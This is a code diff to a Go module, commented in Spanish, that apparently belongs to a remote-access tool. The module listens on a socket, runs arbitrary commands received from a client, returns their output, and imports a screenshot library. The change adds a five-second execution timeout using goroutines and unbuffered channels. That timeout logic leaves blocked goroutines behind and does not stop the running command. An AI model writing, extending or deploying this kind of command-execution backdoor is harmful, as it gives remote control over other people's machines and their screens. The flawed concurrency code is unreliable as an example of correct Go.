@@ -10,6 +10,7 @@ en este modulo se maneja:
 package ejec
 
 import (
+	"context"
 	"encoding/binary"
 	"errors"
 	"fmt"
@@ -19,6 +20,7 @@ import (
 	"os/exec"
 	"regexp"
 	"syscall"
+	"time"
 
 	"github.com/kbinani/screenshot"
 )
@@ -125,6 +127,9 @@ func Envio(conexion net.Conn, salida []byte) error {
 	return nil
 }
 
+var ch_error = make(chan error)
+var ch_salida = make(chan []byte)
+
 func Escucha(conn net.Listener) {
 	for {
 		buffer := make([]byte, TAMAÑO_BUFFER)
@@ -153,16 +158,36 @@ func Escucha(conn net.Listener) {
 
 		} else { // ejecucion de cualquier otro comando
 
-			salida, error := Ejecucion(entrada)
-			if error != nil {
-				fmt.Println(error)
-			}
-			err := Envio(cliente, salida)
-			if err != nil {
-				fmt.Println(err)
+			contexto, cancel := context.WithTimeout(context.Background(), time.Second*5)
+
+			go func() {
+				salida, error := Ejecucion(entrada)
+
+				if error != nil {
+					ch_error <- error
+				} else {
+					ch_salida <- salida
+				}
+
+			}()
+
+			select {
+			case <-contexto.Done():
+				Envio(cliente, []byte("tiempo de ejecucion agotado"))
+				cancel()
+			case salida := <-ch_salida:
+
+				err := Envio(cliente, salida)
+
+				if err != nil {
+					fmt.Println("hubo un problema al enviar")
+				}
+
+			case err := <-ch_error:
+
+				fmt.Println("hubo un problema ", err)
 			}
 
 		}
-
 	}
 }
